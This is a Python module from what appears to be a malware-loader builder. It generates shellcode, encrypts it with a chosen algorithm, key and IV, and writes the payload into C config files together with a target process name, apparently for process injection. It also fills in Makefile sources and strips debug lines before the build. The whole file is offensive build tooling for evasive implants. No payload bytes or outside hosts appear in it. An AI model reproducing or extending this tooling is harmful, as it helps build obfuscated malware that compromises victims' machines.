import os
from ..shellcode import *


def replace_placeholders(file_path, replacements):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        for placeholder, value in replacements.items():
            if placeholder in line:
                lines[i] = line.replace(placeholder, value)
                break

    with open(file_path, 'w') as file:
        file.writelines(lines)

def set_makefile_source_files(source_path):    
    c_files = []
    asm_files = []
    for root, _, files in os.walk(source_path):
        for file in files:
            if file.endswith(".c"):
                c_files.append(os.path.relpath(os.path.join(root, file), start=source_path))
            elif file.endswith(".nasm"):
                asm_files.append(os.path.relpath(os.path.join(root, file), start=source_path))

    formatted_sources = ""
    for i in range(0, len(c_files), 2):
        line = ' '.join(c_files[i:i+2])
        if i + 2 < len(c_files):
            formatted_sources += line + " \\\n"
        else:
            formatted_sources += line
    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* SOURCE_FILES */": formatted_sources})
    
    formatted_asm_sources = ""
    for i in range(0, len(asm_files), 2):
        line = ' '.join(asm_files[i:i+2])
        if i + 2 < len(asm_files):
            formatted_asm_sources += line + " \\\n"
        else:
            formatted_asm_sources += line
    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* ASM_SOURCE_FILES */": formatted_asm_sources})

def fill_config_header(header_data: dict, project_dir: str):
    header_constants = {}
    
    if header_data.get("obfuscation"):
        encryption_method = header_data.get("obfuscation", [])[1].split('_')[0].lower()
    else:
        encryption_method = None
    
    print(f"Using encryption method: {encryption_method}")
    print(header_data.get("obfuscation"))
    shellcode, enc_key, iv = generate_shellcode(header_data.get("shellcode"), algorithm=encryption_method)

    header_constants["Payload"] = {"value": format_shellcode(shellcode, encryption_method), "size": len(shellcode.split(','))}
    if enc_key:
        header_constants["Key"] = {"value": enc_key, "size": len(enc_key.split(',')) if enc_key != "0x00" else 0}
    if iv:
        header_constants["Iv"] = {"value": iv, "size": len(iv.split(',')) if iv != "0x00" else 0}

    if header_data.get("process_name"):
        process_name = header_data["process_name"]
        if not process_name.endswith(".exe"):
            process_name += ".exe"
        header_constants["ProcessName"] = {"value": process_name}


    _write_config_headers(header_data.get("preprocessing_macros", []), header_constants, project_dir)
    

def _write_config_headers(precompil_flags: list = [], constants: list = [], project_dir: str = ""):
    flags = ""
    for flag in precompil_flags:
        if flag:
            flags += f"#define {flag}\n"
    
    flags += "\n"
    
    flags += f"extern {constants["Payload"]["value"].split(" =")[0]};\n"
    flags += f"extern unsigned char Key [];\n"
    flags += f"extern unsigned char Iv [];\n"
    flags += f"extern wchar_t *ProcessName;\n"
    for constant_with_size in [key for key, value in constants.items() if "size" in value]:
        flags += f"extern unsigned long {constant_with_size}Size;\n"

    with open(os.path.join(project_dir, "config.h"), "w") as config_header_file:
        config_header_file.write("#include <wchar.h>\n\n")
        config_header_file.write(flags)

    with open(os.path.join(project_dir, "config.c"), "w") as config_file:
        config_file.write("#include \"config.h\"\n\n")
        
        config_file.write(f"{constants["Payload"]["value"]}\n")
        config_file.write(f"unsigned long PayloadSize = {constants["Payload"]["size"]};\n\n")
        
        if constants.get("Key"):
            config_file.write(f"unsigned char Key [] = {{\n\t{constants["Key"]["value"]}\n}};\n")
            config_file.write(f"unsigned long KeySize = {constants["Key"]["size"]};\n\n")
        
        if constants.get("Iv"):
            config_file.write(f"unsigned char Iv [] = {{\n\t{constants["Iv"]["value"]}\n}};\n")
            config_file.write(f"unsigned long IvSize = {constants["Iv"]["size"]};\n\n")
            
        if constants.get("ProcessName"):
            config_file.write(f"wchar_t *ProcessName =  L\"{constants["ProcessName"]["value"]}\";\n")
        
        config_file.write("\n")
        

def remove_debug_code(word: str, source_path: str):
    if not os.path.exists(source_path):
        raise ValueError(f"The folder path '{source_path}' does not exist.")

    # Recursively walk through the folder and its subfolders
    for root, _, files in os.walk(source_path):
        for file_name in files:
            if not file_name.endswith(('.c', '.h', '.cpp', '.hpp')):
                continue
            
            file_path = os.path.join(root, file_name)

            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                # Filter out lines starting with the provided word
                filtered_lines = [line for line in lines if not line.lstrip().startswith(word)]

                # Rewrite the file with the filtered content
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.writelines(filtered_lines)

            except Exception as e:
                print(f"Error processing file {file_path}: {e}")
